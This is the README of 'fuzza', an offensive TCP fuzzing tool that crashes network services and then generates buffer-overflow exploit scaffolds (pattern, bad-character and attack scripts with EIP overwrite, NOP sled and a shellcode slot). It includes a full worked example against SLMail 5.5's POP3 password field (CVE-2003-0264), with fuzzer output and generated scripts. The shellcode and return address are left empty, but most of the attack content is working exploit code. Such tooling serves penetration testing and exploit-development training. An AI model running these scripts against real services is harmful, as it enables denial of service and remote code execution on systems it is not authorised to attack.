# fuzza

[![](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![PyPI](https://img.shields.io/pypi/v/fuzza)](https://pypi.org/project/fuzza/)
[![PyPI - Status](https://img.shields.io/pypi/status/fuzza)](https://pypi.org/project/fuzza/)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/fuzza)](https://pypi.org/project/fuzza/)
[![PyPI - Format](https://img.shields.io/pypi/format/fuzza)](https://pypi.org/project/fuzza/)
[![PyPI - Implementation](https://img.shields.io/pypi/implementation/fuzza)](https://pypi.org/project/fuzza/)
[![PyPI - License](https://img.shields.io/pypi/l/fuzza)](https://pypi.org/project/fuzza/)

[![Build Status](https://github.com/cytopia/fuzza/workflows/linting/badge.svg)](https://github.com/cytopia/fuzza/actions?workflow=linting)

Customizable TCP fuzzing tool to test for remote buffer overflows.

`fuzza` is able to send and receive any initial commands prior sending the payload as well as
sending any post commands after the payload has been sent. In order to replicate and triage the
buffer overflow, `fuzza` can be used to generate custom python scripts for attack, badchars and
finding the eip based on your command line arguments. See examples for more details.


## Installation
```bash
pip install fuzza
```


## Usage
```bash
$ fuzza --help

usage: fuzza [options] host port
       fuzza --help
       fuzza --version

Customizable TCP fuzzing tool to test for remote buffer overflows.

It works in two different modes: normal and generate. Normal mode will send your payload
to a remote endpoint and increase the payload size each round in order to try to crash the
service. The generate mode however will generate three easy to use python scripts to
further triage any potential buffer overflow manually.

positional arguments:
  host                  IP or hostname to connect to.
  port                  Port to connect to.

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         Show version information,
  -c char, --char char  Buffer character to send as payload. Default: "A"
  -p str, --prefix str  Prefix string to prepend to buffer. Empty by default.
  -s str, --suffix str  Suffix string to append to buffer. Empty by default.
  -l int, --length int  Initial length to concat buffer string with x*char.
                        When using the '-g' option to generate reproducible attack scripts set this
                        to the value at which the crash occured in order to pre-populate the
                        generated scripts. Default: 100
  -m int, --multiply int
                        Round multiplier to concat buffer string with x*char every round.
                        Default: 100
  -i str, --init str    If specified, initializes communication before sending the payload in the
                        form '<send>:<expect>,<send>:<expect>,...'. Where <send> is the data to be
                        sent to the server and <expect> is the answer to be received from the
                        server.  Either one of <send> or <expect> can be omitted if you expect
                        something without having sent data yet or need to send something for which
                        there will not be an answer. Multiple <send>:<expect> are supported and
                        must be separated by a comma.
                        Regex supported for <expect> part.
  -e str, --exit str    If specified, finalizes communication after sending the payload in the
                        form '<send>:<expect>,<send>:<expect>,...'. Where <send> is the data to be
                        sent to the server and <expect> is the answer to be received from the
                        server.  Either one of <send> or <expect> can be omitted if you expect
                        something without having sent data yet or need to send something for
                        which there will not be an answer. Multiple <send>:<expect> are supported
                        and must be separated by a comma.
                        Regex supported for <expect> part.
  -C, --crlf            Send CRLF as line-endings (default: LF)
  -t float, --timeout float
                        Timeout in sec for receiving data before declaring the endpoint as crashed.
                        Default: 30.0
  -d float, --delay float
                        Delay in seconds between each round. Default: 1.0
  -g dir, --generate dir
                        Generate custom python scripts based on your command line arguments
                        to reproduce and triage the overflow. Requires a directory to be
                        specified where to save the scripts to.

example:

  The following example illustrates how to use the initial communication by:
      1. Expecting the POP3 server banner
      2. Sending 'USER bob'
      3. Expecting a welcome message
  Additionally before sending the fuzzing characters, it is prepended with 'PASS ',
  so that the actuall fuzzing can be done on the password:
     1. Prefix payload with 'PASS '
     2. Send payload
  Lastly in order to also close the connection the '-e' opton is used
  (which works exactly as '-i') in order to send data after the payload.
     1. Expect any response from password payload
     2. Terminate the connection via QUIT
     3. Do not expect a follow up response
  $ fuzza -i ':.*POP3.*,USER bob:.*welcome.*' -e ':.*,QUIT:' -p 'PASS '

Visit https://github.com/cytopia/fuzza for more examples.
```


## Modes

### Normal

In normal mode you can communicate with a network service and specify at which stage of the
communication to send an increasing buffer.

The following example sends an ever increasing buffer to host.example.tld at port 4444:
```bash
$ fuzza host.example.tld 4444
```

The following example connects to an IMAP service, waits for its banner and tries to overflow
the password value of `a LOGIN <user> <pass>`:
```bash
$ fuzza -i ':.*' -p 'a LOGIN bob ' host.example.tld 143
```

### Generate

If you have found a potential buffer overflow, it is time to generate your triage scripts with the
same parameter used for finding the overflow.

In the following example you have found a buffer overflow on host.example.tld at port 4444 at
300 characters and can start to generate your files:
```bash
$ fuzza host.example.tld 4444 -l 300 -g output/
```

The scripts will be pre-populated with any command line arguments specified.


#### `pattern.py`

This is the first script you will want to use. It is already pre-populated with characters from
`pattern_create.rb` at length 300. There is no modification required. Simply start your debugger
of choice, watch your application and run `pattern.py` without any arguments. Whatever ends up in
your EIP can be thrown into `pattern_offset.rb` and you have the length of the overflow.
```python
#!/usr/bin/env python
"""fuzza autogenerated."""

from __future__ import print_function
import socket

def str2b(data):
    """Python2/3 compat."""
    try:
        return data.encode('latin1')
    except UnicodeDecodeError:
        return data

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

pattern = (
    "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9"
    "Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9"
    "Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9"
    "Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
)  # 300 bytes from pattern_create.rb

print('Trying to send %s bytes unique chars...' % (str(len(pattern))))
try:
    s.connect(('host.example.tld', 4444))
    s.send(str2b('' + pattern + '' + '\n'))
    print('done')
except:
    print('Could not connect')
s.close()
```

Next thing you will want to do is to adjust the `len_overflow` variable in `badchars.py` and
`attack.py` with the value you found via `pattern_offset.rb`


#### `badchars.py`

This script will help you to identify any characters that are squashed or truncated in memory, ie.
the bad characters that cannot be used for the payload.

Before running it, remember to adjust the `len_overflow` variable.

```python
#!/usr/bin/env python
"""fuzza autogenerated."""

from __future__ import print_function
import socket

def str2b(data):
    """Python2/3 compat."""
    try:
        return data.encode('latin1')
    except UnicodeDecodeError:
        return data

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

len_overflow = 300      # Use pattern_create.rb and pattern_offset.rb to find exact offset
eip          = "B"*4     # Ignore for badchar detection
badchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

buffer = "A"*len_overflow + eip + badchars

print('Trying to send %s bytes buffer...' % (str(len(buffer))))
try:
    s.connect(('host.example.tld', 4444))
    s.send(str2b('' + buffer + '' + '\n'))
    print('done')
except:
    print('Could not connect')
s.close()
```


#### `attack.py`

In this script everything comes together and you can:
1. Adjust the overflow length
2. Adjust the nop sled length
3. Set EIP address
4. Add shellcode
5. Add padding

There is also not much to write, as you just need to fill variables and most other stuff is simply
auto-calculated.
```python
#!/usr/bin/env python
"""fuzza autogenerated."""

from __future__ import print_function
import socket

def str2b(data):
    """Python2/3 compat."""
    try:
        return data.encode('latin1')
    except UnicodeDecodeError:
        return data

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

len_total    = 300                # Start at len_overflow and try out how much can be overwritten
len_overflow = 296                # Use pattern_create.rb and pattern_offset.rb to find exact offset
len_nop_sled = 0                   # Add x bytes of nops before shellcode for shellcode decoding
eip          = "\x42\x42\x42\x42"  # Change this (Keep in mind to put address in reverse order)
shellcode    = ""

padding = "C"*(len_total - len_overflow - len(str(eip)) - len_nop_sled - len(shellcode))
buffer  = "A"*len_overflow + eip + "\x90"*len_nop_sled + shellcode + padding

print('Trying to send %s bytes buffer...' % (str(len(buffer))))
try:
    s.connect(('host.example.tld', 4444))
    s.send(str2b('' + buffer + '' + '\n'))
    print('done')
except:
    print('Could not connect')
s.close()
```


## Examples

### SLMail 5.5 Buffer overflow

#### Overview

* [CVE-2003-0264](https://www.cvedetails.com/cve/CVE-2003-0264/) - buffer overflow in password.

To see how the raw communication works, have a look at the following netcat snippet:
```bash
$ nc mail.example.tld 110
+OK POP3 server mail.example.tld ready <00001.544405549@mail.example.tld>
USER test
+OK test welcome here
PASS LongPassword
-ERR unable to lock mailbox
QUIT
```

#### Find potential overflow length

In order to fuzz the password, all previous communication must have happened. By using `fuzza`,
this can be achieved with the `-i` argument to specify initial data to be send and received.
Additionally we also want to close the connection after sending the payload (if possible).
This can be achieved with the `-e` option which works exactly as `-i`.
```bash
$ fuzza -i ':.*OK POP3.*,USER test:.*test welcome.*' -p 'PASS ' -e ':.*,QUIT:' mail.example.tld 110

------------------------------------------------------------
A * 100
------------------------------------------------------------
Init Awaiting: .*OK POP3.*
Init Received: +OK POP3 server mail.example.tld ready <00005.544236132@mail.example.tld>
Init Sending:  USER test
Init Awaiting: test welcome
Init Received: +OK test welcome here
Sending "PASS " + "A"*100 + ""
Exit Awaiting: .*
Exit Received: -ERR unable to lock mailbox
Exit Sending:  QUIT
...

------------------------------------------------------------
A * 2700
------------------------------------------------------------
Init Awaiting: .*POP3.*
Init Received: +OK POP3 server mail.example.tld ready <00009.592913389@mail.example.tld>
Init Sending:  USER test
Init Awaiting: welcome here
Init Received: +OK test welcome here
Sending "PASS " + "A"*2700 + ""
Exit Awaiting: .*

Remote service (most likely) crashed at 2700 bytes of "A"
Payload sent:
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

#### Generate triaging scripts

Now that you know the application is potentially vulnerable at or before 2700 bytes, you will have
to try to replicate and triage the buffer overflow. In order to do so, you can use `fuzza` to
automatically generate triaging scripts based on your current arguments and findings.

Use the same arguments as before, add the initial length of 2700 bytes (`-l 2700`) and specify
an output directory (`-g <path>`):
```bash
$ fuzza -i ':.*OK POP3.*,USER test:.*test welcome.*' -p 'PASS ' -e ':.*,QUIT:' -l 2700 -g out/ mail.example.tld 110
```
`fuzza` will then generate three files in `out/` directory based on your command line arguments:

1. `attack.py`  - used to replicate and triage buffer overflow
2. `pattern.py` - used to find offset for EIP
3. `badchars.py` - used to find any bad characters for the exploit shellcode

Based on the above specified command line arguments, the triaging scripts will look as follows:

**`attack.py`**
```python
#!/usr/bin/env python
"""fuzza autogenerated."""

from __future__ import print_function
import socket

def str2b(data):
    """Python2/3 compat."""
    try:
        return data.encode('latin1')
    except UnicodeDecodeError:
        return data

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

len_total    = 2700                # Start at len_overflow and try out how much can be overwritten
len_overflow = 2670                # Use pattern_create.rb and pattern_offset.rb to find exact offset
len_nop_sled = 16                  # Add nops if you need to encode your shellcode
eip          = "\x42\x42\x42\x42"  # Change this (Keep in mind to put address in reverse order)
shellcode    = ""

padding = "C"*(len_total - len_overflow - len(str(eip)) - len_nop_sled - len(shellcode))
buffer  = "A"*len_overflow + eip + "\x90"*len_nop_sled + shellcode + padding

print('Trying to send %s bytes buffer...' % (str(len(buffer))))
try:
    s.connect(('mail.example.tld', 110))
    s.recv(1024)
    s.send(str2b('USER test' + '\r\n'))
    s.recv(1024)
    s.send(str2b('PASS ' + buffer + '' + '\r\n'))
    s.recv(1024)
    s.send(str2b('QUIT' + '\r\n'))
    print('done')
except:
    print('Could not connect')
```

**`pattern.py`**
```python
#!/usr/bin/env python
"""fuzza autogenerated."""

from __future__ import print_function
import socket

def str2b(data):
    """Python2/3 compat."""
    try:
        return data.encode('latin1')
    except UnicodeDecodeError:
        return data

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

pattern = (
    "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9"
    "Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9"
    "Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9"
    "Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9"
    "Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9"
    "Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9"
    "As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9"
    "Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9"
    "Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9"
    "Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9"
    "Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9"
    "Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9"
    "Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9"
    "Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9"
    "Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9"
    "Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9"
    "Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9"
    "Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9"
    "Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9"
    "Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9"
    "Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9"
    "Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9"
    "Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9"
    "Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9"
    "Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9"
    "Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9"
    "Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9"
    "Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9"
    "Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9"
    "Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"
)  # 2700 bytes from pattern_create.rb

print('Trying to send %s bytes unique chars...' % (str(len(pattern))))
try:
    s.connect(('mail.example.tld', 110))
    s.recv(1024)
    s.send(str2b('USER test' + '\r\n'))
    s.recv(1024)
    s.send(str2b('PASS ' + pattern + '' + '\r\n'))
    s.recv(1024)
    s.send(str2b('QUIT' + '\r\n'))
    print('done')
except:
    print('Could not connect')
```

**`badchars.py`**
```python
#!/usr/bin/env python
"""fuzza autogenerated."""

from __future__ import print_function
import socket

def str2b(data):
    """Python2/3 compat."""
    try:
        return data.encode('latin1')
    except UnicodeDecodeError:
        return data

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

len_overflow = 2700      # Use pattern_create.rb and pattern_offset.rb to find exact offset
eip          = "B"*4     # Ignore for badchar detection
badchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

buffer = "A"*len_overflow + eip + badchars

print('Trying to send %s bytes buffer...' % (str(len(buffer))))
try:
    s.connect(('mail.example.tld', 110))
    s.recv(1024)
    s.send(str2b('USER test' + '\r\n'))
    s.recv(1024)
    s.send(str2b('PASS ' + buffer + '' + '\r\n'))
    s.recv(1024)
    s.send(str2b('QUIT' + '\r\n'))
    print('done')
except:
    print('Could not connect')
```


## License

**[MIT License](LICENSE.txt)**

Copyright (c) 2020 **[cytopia](https://github.com/cytopia)**
